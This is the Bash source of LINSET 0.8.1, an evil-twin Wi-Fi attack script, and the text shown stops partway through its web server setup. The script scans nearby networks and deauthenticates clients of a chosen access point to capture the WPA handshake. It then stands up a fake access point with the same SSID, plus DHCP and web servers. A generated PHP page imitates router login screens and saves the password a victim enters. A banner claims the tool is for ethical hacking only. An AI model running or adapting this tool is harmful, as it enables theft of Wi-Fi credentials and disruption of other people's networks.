#!/bin/bash

########## Modo DEBUG ##########
##			      ##
        LINSET_DEBUG=0
##			      ##
################################


#################################################################
#                                                               #
# # -*- ENCODING: UTF-8 -*-                                     #
# Este programa es software libre. Puede redistribuirlo y/o     #
# modificar-lo bajo los términos de la Licencia Pública General #
# de GNU según es publicada por la Free Software Foundation,    #
# bien de la versión 3 de dicha Licencia o bien (según su       #
# elección) de cualquier versión posterior.                     #
#                                                               #
# Si usted hace alguna modificación en esta aplicación,         #
# deberá siempre mencionar al autor original de la misma.       #
#                                                               #
# Autor:Script creado por vk496                                 #
#                                                               #
# Integra funciones de Airoscript-ng                            #
# Funcion Seleccion Objetivo de Handshaker                      #
# Intro tomada de ONO Netgear WPA2 Hack                         #
#                                                               #
# Un saludo                                                     # 
#                                                               #
#################################################################


########## 06-11-2013 LINSET 0.1
##
## #Fecha de Salida
##
########## 07-11-2013 LINSET 0.1b
## 
## #Cambiado el Fakeweb a Inglés
## #Añadida funcion para quitar el modo monitor al salir
## #Arreglado Bucle para no colapsar la pantalla con información
## #Colocada opción de seleccionar otra red
## #Eliminado mensaje sobrante de iwconfig
##
########## 10-11-2013 LINSET 0.2
##
## #Añadido Changelog
## #Reestructurado el codigo
## #Cambiada la posición de ventanas xterm
## #Eliminada creacion extra del archivo route
## #Movido pantalla de comprobacion de handshake a una ventana xterm
## #Añadido menu durante el ataque
## #Añadida comprobacion de dependencias
##
########## 22-11-2013 LINSET 0.3
##
## #Arreglado mensaje de Handshake (no se mostraba bien)
## #Añadida interface de routers Telefonica y Jazztel (Xavi y Zyxel)
## #Fix cuando se usaba canales especificos (exit inesperado)
## #Mejorado DEBUG (function_clear y HOLD)
## #Migración de airbase-ng a hostapd
## #Reestructurado mas codigo
## #Añadido header
## #Añadida funcion para eliminar interfaces en modo monitor sobrantes
##
########## 30-11-2013 LINSET 0.4
##
## #Agregado soporte a airbase-ng junto a hostapd
## #Capacidad para comprobar pass sin handshake (modo Airlin"
## #Arregladas problemas con variables
## #Fix espacio Channel
## #Eliminada seleccion con multiples tarjetas de red
## #Arreglado error sintactico HTML de las interfaces Xavi
## #Implementada interface Zyxel (de routers de Telefonica también)
##
########## 07-12-2013 LINSET 0.5
##
## #Arreglado bug que impide usar mas de una interface
## #Migración de iwconfig a airmon-ng
## #Añadida interface HomeStation (Telefonica)
## #Arregladas llamadas PHP a error2.html inexistente
## #Arreglado bug que entraba en seleccion de Objetivos sin que se haya creado el CSV correspondiente
## #Opcion Salir en el menu de seleccion de webinterfaces
## #Arreglado bug que entraba en seleccion de Clientes sin que los haya
## #Arreglado bug que entraba en seleccion de Canal sin que haya interface valida seleccionada
##
########## 11-12-2013 LINSET 0.6
##
## #Bug al realizar deauth especifico sin que haya airodump en marcha
## #Modificadas variables que gestionan los CSV
## #Modificada estetica a la hora de seleccionar objetivo
## #Añadidos colores a los menus
## #Modificado funcionamiento interno de seleccion de opciones
## #Arreglado bug de variables en la comprobacion de dependencias
## #Añadida dependencia para ser root
##
########## 15-12-2013 LINSET 0.7
##
## #Añadido intro
## #Mejoradas variables de colores
## #Añadida interface de los routers Compal Broadband Networks (ONOXXXX)
## #Mejorada la gestion de la variable de Host_ENC
## #Arreglado bug que entraba en modo de FakeAP elegiendo una opcion inexistente
## #Modificado nombre de HomeStation a ADB Broadband (según su MAC)
## #Agregada licencia GPL v3
##
########## 27-12-2013 LINSET 0.8
##
## #Modificada comprobación de permisos para mostrar todo antes de salir
## #Añadida funcion para matar software que use el puerto 80
## #Agregado dhcpd a los requisitos
## #Cambiado titulo de dependecia de PHP (php5-cgi)
## #Modificado parametro deauth para PC's sin el kernel parcheado
## #Añadida funcion para matar software que use el puerto 53
## #Funcion para remontar los drivers por si se estaba usando la interface wireless
## #Modificada pantalla que comprueba el handshake (mas info) y mejoradas las variables
## #Mejorado menu de comprobacion de password con mas información
## #Añadida lista de clientes que se muestran en el menu de comprobacion de password
## #Cambiado ruta de guardado de password al $HOME
## #Reestructuracion completa del codigo para mejor compresion/busqueda
## #El intro no aparecerá si estas en modo desarrollador
## #No se cerrará el escaneo cuando se compruebe el handshake
#
## #Agregada funcion faltante a la 0.8 inicial (me lo comi sin querer)
#
########## 10-01-2014 LINSET 0.8.1
##
## #Nueva Intro, torre if-else por TottyRun
## #Cambio de colores para una interfaz a mi modo mas "colorida"
## #Correcciones ortograficas
## #Agregada opcion de reescanear redes en el menu "CAPTURAR HANDSHAKE DEL CLIENTE"
## #Establecido unico objetivo de uso : Educacional
##########
clear



##################################### < CONFIGURACION DEL SCRIPT > #####################################

# Ruta de almacenamiento de datos
DUMP_PATH="/tmp/linset"
# Numero de desautentificaciones 
DEAUTHTIME="8"
# Rango de IP que se usaran en DHCP
IP=192.168.1.1
# Crea variable de de una red a partir del Gateway
RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)

# Ajusta el Script en modo normal o desarrollador
if [ $LINSET_DEBUG = 1 ]; then
    ## set to /dev/stdout when in developer/debugger mode
    export linset_output_device=/dev/stdout
        HOLD="-hold"
  else
    ## set to /dev/null when in production mode
    HOLD=""
    export linset_output_device=/dev/null
fi

# Hacer clears si el modo es normal
function conditional_clear() {
    if [[ "$linset_output_device" != "/dev/stdout" ]]; then clear; fi
}

#Colores
blanco="\033[1;37m"
gris="\033[0;37m"
magenta="\033[0;35m"
rojo="\033[1;31m"
verde="\033[1;32m"
amarillo="\033[1;33m"
azul="\033[1;34m"
cyano="\033[1;36m"
rescolor="\e[0m"

# Genera listado de Interfaces en el Script
readarray -t webinterfaces < <(echo -e "Tp-link Technologies (WRXXXY) (green)
Xavi Technologies (WLAN_XX)
Zyxel Communication (WLAN_XX)
ADB Broadband (WLAN_XXXX) (HomeStation)
Compal Broadband Networks (ONOXXXX)
\e[1;31mSalir"$rescolor""
)

##################################### < CONFIGURACION DEL SCRIPT > #####################################






############################################## < INICIO > ##############################################

# Intro del script
if [ $LINSET_DEBUG != 1 ]; then

echo ""
sleep 0.1 && echo -e "$amarillo                   if"
sleep 0.1 && echo -e "$amarillo                   if"
sleep 0.1 && echo -e "$amarillo                   if"
sleep 0.1 && echo -e "$amarillo                   if"
sleep 0.1 && echo -e "$amarillo                   if"
sleep 0.1 && echo -e "$amarillo                   if"
sleep 0.1 && echo -e "$amarillo                   if"
sleep 0.1 && echo -e "$amarillo                  else"
sleep 0.1 && echo -e "$amarillo                  else"
sleep 0.1 && echo -e "$amarillo                 ifelse"      
sleep 0.1 && echo -e "$amarillo                  else"
sleep 0.1 && echo -e "$amarillo                  else"
sleep 0.1 && echo -e "$amarillo                ifelseif"
sleep 0.1 && echo -e "$amarillo                ifelseif"
sleep 0.1 && echo -e "$amarillo               elseifelse                  $cyano                    _    _ _   _  ____  _____ _______   "    
sleep 0.1 && echo -e "$amarillo              ifelseifelse                 $cyano                   | |  | | \ | |/ ___\/  ___|__   __|  "
sleep 0.1 && echo -e "$amarillo            elseifelseifelse               $cyano                   | |  | |  \| | |___ | |___   | |     "
sleep 0.1 && echo -e "$amarillo              ifelseifelse                 $cyano                   | |  | | .   |\___ \|  ___|  | |     "
sleep 0.1 && echo -e "$amarillo              ifelseifelse                 $cyano                   | |__| | |\  |____| | |___   | |     "
sleep 0.1 && echo -e "$amarillo              else    else                 $cyano                   |____|_|_| \_|\____/\_____|  |_|     "
sleep 0.1 && echo -e "$amarillo             else       else"       
sleep 0.1 && echo -e "$amarillo            else         else"
sleep 0.1 && echo -e "$amarillo           else           else"
sleep 0.1 && echo -e "$azul          else             else"
sleep 0.1 && echo -e "$azul       ifelseifelseifelseifelseif    $amarillo            _       ______  ___ $blanco    __$amarillo   ___  $verde    __  __           __"
sleep 0.1 && echo -e "$azul       ifelseifelseifelseifelseif    $amarillo           | |     / / __ \/   |$blanco   / /$amarillo  |__ \ $verde   / / / /___ ______/ /__"
sleep 0.1 && echo -e "$azul       ifelseifelseifelseifelseif    $amarillo           | | /| / / /_/ / /| |$blanco  / / $amarillo  __/ / $verde  / /_/ / __  / ___/ //_/" 
sleep 0.1 && echo -e "$azul       ifelseifelseifelseifelseif    $amarillo           | |/ |/ / ____/ ___ |$blanco / /  $amarillo / __/  $verde / __  / /_/ / /__/ ,<"
sleep 0.1 && echo -e "$azul       elseifelseif    elseifelseif  $amarillo           |__/|__/_/   /_/  |_|$blanco/_/   $amarillo/____/  $verde/_/ /_/\__,_/\___/_/|_|"                   
sleep 0.1 && echo -e "$rojo      elseifelse          elseifelse"
sleep 0.1 && echo -e "$rojo      ifelseif                ifelseif" 
sleep 0.1 && echo -e "$rojo    ifelse                      ifelse"     $rojo  "                           LINSET "$blanco"0.8.1 "$amarillo"by "$blanco" TottyRun"
sleep 0.1 && echo -e "$rojo   ifelse                        ifelse"    $verde "                       Uso exclusivo de "$rojo"Hacking Ético"$rescolor
sleep 0.1 && echo -e "$rojo  ifelse                          ifelse"
sleep 0.1 && echo -e "$rojo ifelse                             ifelse"
sleep 0.1 && echo ""
sleep 0.1 && echo ""
sleep 3

fi

# Muestra el mensaje principal del script
function mostrarheader(){
conditional_clear
echo -e '\e[0;35m#########################################################'
echo -e '\e[0;35m#                                                       #'
echo -e '\e[0;35m#''\e[1;32m		  LINSET 0.8.1' '\e[1;33mby ''\e[1;34mTottyRun''\e[0;35m              #'
echo -e '\e[0;35m#''\e[1;31m	L''\e[1;33minset' '\e[1;31mI''\e[1;33ms' '\e[1;31mN''\e[1;33mot a ''\e[1;31mS''\e[1;33mocial ''\e[1;31mE''\e[1;33mnginering' '\e[1;31mT''\e[1;33mool''\e[0;35m          #'
echo -e '\e[0;35m#                                                       #'
echo -e '\e[0;35m#########################################################'"$rescolor"
echo
echo
}

# Comprueba la existencia de todas las dependencias
function checkprivilegies {
echo -ne "Root--->	"
if ! [ $(id -u) = "0" ] 2>/dev/null; then
    echo -e "\e[1;31mYou don't have admin privilegies"$rescolor""
    salir=1
else
    echo -e "\e[1;32mOK!"$rescolor""
fi

echo -ne "Aircrack--->	"
if ! hash aircrack-ng 2>/dev/null; then
    echo -e "\e[1;31mNot installed"$rescolor""
    salir=1
else
    echo -e "\e[1;32mOK!"$rescolor""
fi

echo -ne "Dhcpd--->	"
if ! hash dhcpd 2>/dev/null; then
    echo -e "\e[1;31mNot installed"$rescolor" (isc-dhcp-server)"
    salir=1
else
    echo -e "\e[1;32mOK!"$rescolor""
fi

echo -ne "Hostapd--->	"
if ! hash hostapd 2>/dev/null; then
    echo -e "\e[1;31mNot installed"$rescolor""
    salir=1
else
    echo -e "\e[1;32mOK!"$rescolor""
fi

echo -ne "Lighttpd--->	"
if ! hash lighttpd 2>/dev/null; then
    echo -e "\e[1;31mNot installed"$rescolor""
    salir=1
else
    echo -e "\e[1;32mOK!"$rescolor""
fi

echo -ne "Macchanger--->	"
if ! hash macchanger 2>/dev/null; then
    echo -e "\e[1;31mNot installed"$rescolor""
    salir=1
else
    echo -e "\e[1;32mOK!"$rescolor""
fi

echo -ne "Php5-cgi--->	"
if ! [ -f /usr/bin/php-cgi ]; then
    echo -e "\e[1;31mNot installed"$rescolor""
    salir=1
else
    echo -e "\e[1;32mOK!"$rescolor""
fi

echo -ne "Python--->	"
if ! hash python 2>/dev/null; then
    echo -e "\e[1;31mNot installed"$rescolor""
    salir=1
else
    echo -e "\e[1;32mOK!"$rescolor""
fi

echo -ne "Xterm--->	"
if ! hash xterm 2>/dev/null; then
    echo -e "\e[1;31mNot installed"$rescolor""
    salir=1
else
    echo -e "\e[1;32mOK!"$rescolor""
fi

if [ "$salir" = "1" ]; then
exit
fi
}

# Mostrar info del AP seleccionado
function infoap {
Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | awk '{ print $5,$6,$7 }'`
echo "INFO AP OBJETIVO"
echo
echo -e "                     "$verde"SSID"$rescolor" = $Host_SSID /$Host_ENC"
echo -e "                    "$verde"Canal"$rescolor" = $channel"
echo -e "                "$verde"Velocidad"$rescolor" = ${speed:2} Mbps"
echo -e "               "$verde"MAC del AP"$rescolor" = $mac (\e[1;33m$Host_MAC_MODEL"$rescolor")"
echo
}

############################################## < INICIO > ##############################################






############################################### < MENU > ###############################################

# Se detecta la resolucion optima de nuestro equipo
function setresolution {

function resA {
# Upper left window +0+0 (size*size+position+position)
TOPLEFT="-geometry 90x13+0+0"
# Upper right window -0+0
TOPRIGHT="-geometry 83x26-0+0"
# Bottom left window +0-0
BOTTOMLEFT="-geometry 90x24+0-0"
# Bottom right window -0-0
BOTTOMRIGHT="-geometry 75x12-0-0"
TOPLEFTBIG="-geometry 91x42+0+0"
TOPRIGHTBIG="-geometry 83x26-0+0"
}
function resB {
# Upper left window +0+0 (size*size+position+position)
TOPLEFT="-geometry 92x14+0+0"
# Upper right window -0+0
TOPRIGHT="-geometry 68x25-0+0"
# Bottom left window +0-0
BOTTOMLEFT="-geometry 92x36+0-0"
# Bottom right window -0-0
BOTTOMRIGHT="-geometry 74x20-0-0"
TOPLEFTBIG="-geometry 100x52+0+0"
TOPRIGHTBIG="-geometry 74x30-0+0"
}
function resC {
# Upper left window +0+0 (size*size+position+position)
TOPLEFT="-geometry 100x20+0+0"
# Upper right window -0+0
TOPRIGHT="-geometry 109x20-0+0"
# Bottom left window +0-0
BOTTOMLEFT="-geometry 100x30+0-0"
# Bottom right window -0-0
BOTTOMRIGHT="-geometry 109x20-0-0"
TOPLEFTBIG="-geometry  100x52+0+0"
TOPRIGHTBIG="-geometry 109x30-0+0"
}
function resD {
# Upper left window +0+0 (size*size+position+position)
TOPLEFT="-geometry 110x35+0+0"
# Upper right window -0+0
TOPRIGHT="-geometry 99x40-0+0"
# Bottom left window +0-0
BOTTOMLEFT="-geometry 110x35+0-0"
# Bottom right window -0-0
BOTTOMRIGHT="-geometry 99x30-0-0"
TOPLEFTBIG="-geometry 110x72+0+0"
TOPRIGHTBIG="-geometry 99x40-0+0"
}
function resE {
# Upper left window +0+0 (size*size+position+position)
TOPLEFT="-geometry 130x43+0+0"
# Upper right window -0+0
TOPRIGHT="-geometry 68x25-0+0"
# Bottom left window +0-0
BOTTOMLEFT="-geometry 130x40+0-0"
BOTTOMRIGHT="-geometry 132x35-0-0"
TOPLEFTBIG="-geometry 130x85+0+0"
TOPRIGHTBIG="-geometry 132x48-0+0"
}
function resF {
# Upper left window +0+0 (size*size+position+position)
TOPLEFT="-geometry 100x17+0+0" # capturando datos de victima ...  ( VENTANA AIRODUMP ATAUQE )
# Upper right window -0+0
TOPRIGHT="-geometry 90x27-0+0" # desautenticando
# Bottom left window +0-0
BOTTOMLEFT="-geometry 100x30+0-0" # aireplay , CHOPCHOP , FRAGMENTACION... ( VENTANA BAJO CAPTURAS DE AIRODUMP )
# Bottom right window -0-0
BOTTOMRIGHT="-geometry 90x20-0-0" # ASOCIANDO CON... ( VENTANA ROJA )
TOPLEFTBIG="-geometry  100x70+0+0" # escaneando objetivos ... ( ESCANEO INICIAL )
TOPRIGHTBIG="-geometry 90x27-0+0"  # AIRCRACK ... ( BUSQUEDA DE KEYS ) 
}

detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
##  A) 1024x600
##  B) 1024x768
##  C) 1280x768
##  D) 1280x1024
##  E) 1600x1200
case $detectedresolution in
   "1024x600" ) resA ;;
   "1024x768" ) resB ;;
   "1280x768" ) resC ;;
   "1366x768" ) resC ;;
  "1280x1024" ) resD ;;
  "1600x1200" ) resE ;;
  "1366x768"  ) resF ;;
            * ) resA ;; ## fallback a una opción segura
esac
}

# Escoge las interfaces a usar
function setinterface {
# Coge todas las interfaces en modo monitor para detenerlas
KILLMONITOR=`airmon-ng|grep "mon*" | awk '{print $1}'`

for monkill in ${KILLMONITOR[@]}; do
airmon-ng stop $monkill >$linset_output_device
echo -n "$monkill, "
done

# Crea una variable con la lista interfaces de red fisicas
readarray -t wirelessifaces < <(airmon-ng |grep "wlan*" | awk '{print $1}')
INTERFACESNUMBER=`airmon-ng| grep -c "wlan*"`

echo
echo
echo Autodetectando Resolución...
echo $detectedresolution
echo


# Si solo hay 1 tarjeta wireless
if [ "$INTERFACESNUMBER" -gt "0" ]; then

echo "Selecciona una interface:"
echo

i=0
for line in "${wirelessifaces[@]}"; do
  i=$(($i+1))
  wirelessifaces[$i]=$line
  echo -e "$verde""$i)"$rescolor" $line"
done
echo -n "#? "

read line
PREWIFI=${wirelessifaces[$line]}

readarray -t softwaremolesto < <(airmon-ng check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')

WIFIDRIVER=$(airmon-ng | grep "$PREWIFI" | awk '{ print $4 }')

modprobe -r "$WIFIDRIVER" &>$linset_output_device

for molesto in "${softwaremolesto[@]}"; do
  killall "$molesto" &>$linset_output_device
done

modprobe "$WIFIDRIVER" &>$linset_output_device

# Selecciona una interface
  select PREWIFI in $INTERFACES; do
    break;
  done
    WIFIMONITOR=$(airmon-ng start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
    WIFI_MONITOR=$WIFIMONITOR
# Establece una variable para la interface fisica
  WIFI=$PREWIFI
# Cerrar si no detecta nada
else

echo No se han encontrado tarjetas Wireless. Cerrando...
sleep 5
exitmode
fi

vk496

}

# Intermediario que comprueba validez de la eleccion y prepara el entorno
function vk496 {
if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
conditional_clear && mostrarheader && checkprivilegies &&setinterface && break
fi

conditional_clear
CSVDB=dump-01.csv
mkdir $DUMP_PATH &>$linset_output_device

rm -rf $DUMP_PATH/*

choosescan
selection
}

# Elige si quieres escanear todos los canales o uno especifico
function choosescan {
conditional_clear
 
while true; do
  conditional_clear
mostrarheader

  echo "Método de canal"
  echo "                                       "
  echo -e "      "$verde"1)"$rescolor" Todos los canales             "
  echo -e "      "$verde"2)"$rescolor" Canal(es) específico(s)       "
  echo "                                       "
  echo -n "      #> "
  read yn
  echo ""
  case $yn in
    1 ) Scan ; break ;;
    2 ) Scanchan ; break ;;  
    * ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
  esac
done
}

# Elige que canal/es escanear si elegiste esa opcion
function Scanchan {
conditional_clear
mostrarheader

  echo "                                       "
  echo "      Selecciona Canal de busqueda     "
  echo "                                       "
  echo -e "     Un solo canal     "$verde"6"$rescolor"               "
  echo -e "     rango de canales  "$verde"1-5"$rescolor"             "
  echo -e "     Multiples canales "$verde"1,2,5-7,11"$rescolor"      "
  echo "                                       "
echo -n "      #> "
read channel_number
set -- ${channel_number}
conditional_clear

rm -rf $DUMP_PATH/dump*
xterm $HOLD -title "Escaneando Objetivos en el canal -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR
}

# Escanea toda la red
function Scan {
conditional_clear

xterm $HOLD -title "Escaneando Objetivos ..." $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR
}

# Elige una red de todas las escaneadas
function selection {
conditional_clear
mostrarheader


LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`

if [ $LINEAS_WIFIS_CSV -le 3 ]; then
vk496 && break
fi

linap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
linap=`expr $linap - 1`
head -n $linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv 
tail -n +$linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv 
echo "                         Access Points Disponibles "
echo ""                         
echo " #      MAC                      CHAN    SECU     PWR    ESSID"
echo ""
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
 longueur=${#MAC}
   if [ $longueur -ge 17 ]; then
    i=$(($i+1))
    POWER=`expr $POWER + 100`
    CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
if [ "$CLIENTE" != "" ]; then
  CLIENTE="*" 
fi
    echo -e " ""$verde"$i")"$blanco"$CLIENTE\t""$amarillo"$MAC"\t""$verde"$CHANNEL"\t""$rojo"${PRIVACY:0:5}"\t  ""$amarillo"$POWER%"\t""$verde"$ESSID""$rescolor""
    aidlenght=$IDLENGTH
    assid[$i]=$ESSID
    achannel[$i]=$CHANNEL
    amac[$i]=$MAC
    aprivacy[$i]=$PRIVACY
    aspeed[$i]=$SPEED
   fi
done < $DUMP_PATH/dump-02.csv
echo
echo -e ""$verde"("$blanco"*"$verde") Red con Clientes"$rescolor""
echo ""
echo "        Selecciona Objetivo               "
echo -n "      #> "
read choice
idlenght=${aidlenght[$choice]}
ssid=${assid[$choice]}
channel=$(echo ${achannel[$choice]}|tr -d [:space:])
mac=${amac[$choice]}
privacy=${aprivacy[$choice]}
speed=${aspeed[$choice]}
Host_IDL=$idlength
Host_SPEED=$speed
Host_ENC=${privacy:0:4}
Host_MAC=$mac
Host_CHAN=$channel
acouper=${#ssid}
fin=$(($acouper-idlength))
Host_SSID=${ssid:1:fin}

conditional_clear

askAP
}

# Elige el modo del FakeAP
function askAP {

DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`

if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
selection && break
fi

mostrarheader
while true; do
infoap

  echo "Modo de FakeAP"
  echo "                                       "
  echo -e "      "$verde"1)"$rescolor" Hostapd ("$rojo"Recomendado"$rescolor")"
  echo -e "      "$verde"2)"$rescolor" airbase-ng (Usar si hay problemas con handshake)"
  echo -e "      "$verde"3)"$rescolor" Salir"
  echo "                                       "
  echo -n "      #> "
  read yn
  echo ""
  case $yn in
    1 ) fakeapmode="hostapd"; authmode="handshake"; askclientsel; break ;;
    2 ) fakeapmode="airbase-ng"; askauth; break ;;
    3 ) exitmode; break ;;
    * ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
  esac
done 

} 

# Metodo de comprobacion de PASS si elegiste airbase-ng
function askauth {
conditional_clear

mostrarheader
while true; do

  echo "METODO DE VERIFICACIÓN DE PASS"
  echo "                                       "
  echo -e "      "$verde"1)"$rescolor" Handshake ("$rojo"Recomendado"$rescolor")"
  echo -e "      "$verde"2)"$rescolor" wpa_supplicant (Menos efectivo / Mas fallos)"
  echo -e "      "$verde"3)"$rescolor" Salir"
  echo "                                       "
  echo -n "      #> "
  read yn
  echo ""
  case $yn in
    1 ) authmode="handshake"; askclientsel; break ;;
    2 ) authmode="wpa_supplicant"; webinterface; break ;;
    3 ) exitmode; break ;;
    * ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
  esac
done 

} 

############################################### < MENU > ###############################################






############################################# < HANDSHAKE > ############################################

# Tipo de Deauth que se va a realizar
function askclientsel {
conditional_clear

while true; do
mostrarheader

  echo "CAPTURAR HANDSHAKE DEL CLIENTE"
  echo "                                       "
  echo -e "      "$verde"1)"$rescolor" Realizar desaut. masiva al AP objetivo"
  echo -e "      "$verde"2)"$rescolor" Realizar desaut. especifica al AP objetivo"
  echo -e "      "$verde"3)"$rescolor" Escanear redes de nuevo"
  echo -e "      "$verde"4)"$rescolor" Salir"
  echo "                                       "
  echo -n "      #> "
  read -s yn
  echo ""
  case $yn in
    1 ) deauth all; break ;;
    2 ) deauth esp; break ;;
    3 ) killall airodump-ng &>$linset_output_device; vk496; break;;    
    4 ) exitmode; break ;;
    * ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
  esac
done 

}

# 
function deauth {
conditional_clear

iwconfig $WIFI_MONITOR channel $Host_CHAN

case $1 in
  all )
  DEAUTH=deauthall
  capture & $DEAUTH
  CSVDB=$Host_MAC-01.csv
;;
  esp )
  DEAUTH=deauthesp
  HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`

LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
if [ $LINEAS_CLIENTES -le 5 ]; then
  DEAUTH=deauthall
  capture & $DEAUTH
  CSVDB=$Host_MAC-01.csv
  deauth
fi
capture
for CLIENT in $HOST; do
  Client_MAC=`echo ${CLIENT:0:17}`	
  deauthesp
done
$DEAUTH
CSVDB=$Host_MAC-01.csv
;;
esac


deauthMENU

}

function deauthMENU {


while true; do
conditional_clear
mostrarheader


  echo "¿SE CAPTURÓ el HANDSHAKE?"
  echo "                                       "
  echo -e "      "$verde"1)"$rescolor" Si" 
  echo -e "      "$verde"2)"$rescolor" No (lanzar ataque de nuevo)"
  echo -e "      "$verde"3)"$rescolor" No (seleccionar otro ataque)"  
  echo -e "      "$verde"4)"$rescolor" Seleccionar otra red" 
  echo -e "      "$verde"5)"$rescolor" Escanear redes de nuevo"
  echo -e "      "$verde"6)"$rescolor" Salir"
  echo " "
  echo -n '      #> '
  read yn
  
  case $yn in
    1 ) checkhandshake;;
    2 ) capture; $DEAUTH ;;
    3 ) conditional_clear; askclientsel; break;;
    4 ) killall airodump-ng &>$linset_output_device; CSVDB=dump-01.csv; breakmode=1; selection; break ;;
    6 ) exitmode; break;;
    5 ) killall airodump-ng &>$linset_output_device; vk496; break;;
    * ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
  esac

done
}

# Capruta todas las redes
function capture {
conditional_clear
if ! ps -A | grep -q airodump-ng; then

rm -rf $DUMP_PATH/$Host_MAC*
xterm $HOLD -title "Capturando datos en el canal --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &

fi
}

# Comprueba el handshake antes de continuar
function checkhandshake {
if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
killall airodump-ng &>$linset_output_device
webinterface
break
fi
}

############################################# < HANDSHAKE > ############################################






############################################# < ATAQUE > ############################################

# Selecciona interfaz web que se va a usar
function webinterface {
conditional_clear
mostrarheader

infoap
echo
echo "SELECCIONA LA INTERFACE WEB"
echo
i=0
for line in "${webinterfaces[@]}"; do
  i=$(($i+1))
  webinterfaces[$i]=$line
 echo -e "$verde""$i)"$rescolor" $line"
done



echo
echo -n "#? "
read line
webinterface=${webinterfaces[$line]}

if echo "$webinterface" | grep -q Salir; then
exitmode
elif echo "$webinterface" | grep -qi "tp-link"; then
TP-LINK
elif echo "$webinterface" | grep -qi "Xavi"; then
XAVI
elif echo "$webinterface" | grep -qi "Zyxel"; then
ZYXEL
elif echo "$webinterface" | grep -qi "HomeStation"; then
HOMESTATION
elif echo "$webinterface" | grep -qi "Compal"; then
ONO
fi

preatack
atack
}

# Crea distintas configuraciones necesarias para el script y preapa los servicios
function preatack {

# Genera el config de hostapd
echo "
interface=$WIFI
driver=nl80211
ssid=$Host_SSID
channel=$Host_CHAN
">$DUMP_PATH/hostapd.conf

# Crea el php que usan las ifaces
echo "<?php
error_reporting(0);

\$count_my_page = (\"../hit.txt\");
\$hits = file(\$count_my_page);
\$hits[0] ++;
\$fp = fopen(\$count_my_page , \"w\");
fputs(\$fp , \"\$hits[0]\");
fclose(\$fp);

// Receive form Post data and Saving it in variables

\$key1 = @\$_POST['key1'];

// Write the name of text file where data will be store
\$filename = \"../data.txt\";
\$filename2 = \"../status.txt\";


// Marge all the variables with text in a single variable. 
\$f_data= ''.\$key1.'';


if ( (strlen(\$key1) < 8) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"The password must be more than 8 characters\\\");window.history.back()</script>\";
break;
}

if ( (strlen(\$key1) > 63) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"The password must be less than 64 characters\\\");window.history.back()</script>\";
break;
}


\$file = fopen(\$filename, \"w\");
fwrite(\$file,\"\$f_data\");
fwrite(\$file,\"\n\");
fclose(\$file);
" > $DUMP_PATH/data/savekey.php

# Según el metodo elegido, se cambia el tiempo de espera para dar un resultado en la iface 
if [ $authmode = "handshake" ]; then
echo "sleep(3);" >> $DUMP_PATH/data/savekey.php
elif [ $authmode = "wpa_supplicant" ]; then
echo "sleep(6);" >> $DUMP_PATH/data/savekey.php
fi

# Se continua con el resto de la configuracion
echo "
if ( (file_exists(\$filename2)) ) {
header(\"location:final.html\");
} else {
header(\"location:error.html\");
}


?>" >> $DUMP_PATH/data/savekey.php

# Se crea el config del servidor DHCP
echo "authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet $RANG_IP.0 netmask 255.255.255.0 {

option broadcast-address $RANG_IP.255;
option routers $IP;
option subnet-mask 255.255.255.0;
option domain-name-servers $IP;

range $RANG_IP.100 $RANG_IP.250;

} 
" >$DUMP_PATH/dhcpd.conf

# Se crea el config del servidor web Lighttpd
echo "server.document-root = \"$DUMP_PATH/\"

server.modules = (
  \"mod_access\",
  \"mod_alias\",
  \"mod_accesslog\",
  \"mod_fastcgi\",
  \"mod_redirect\",
  \"mod_rewrite\"
) 

fastcgi.server = ( \".php\" => ((
                   \"bin-path\" => \"/usr/bin/php-cgi\",
                   \"socket\" => \"/php.socket\"
                )))

server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"
# server.username = \"www\"
# server.groupname = \"www\"

mimetype.assign = (
\".html\" => \"text/html\",
\".htm\" => \"text/html\",
\".txt\" => \"text/plain\",
\".jpg\" => \"image/jpeg\",
\".png\" => \"image/png\",
\".css\" => \"text/css\"
)


server.error-handler-404 = \"/\"






static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
index-file.names = ( \"index.htm\" )
" >$DUMP_PATH/lighttpd.conf

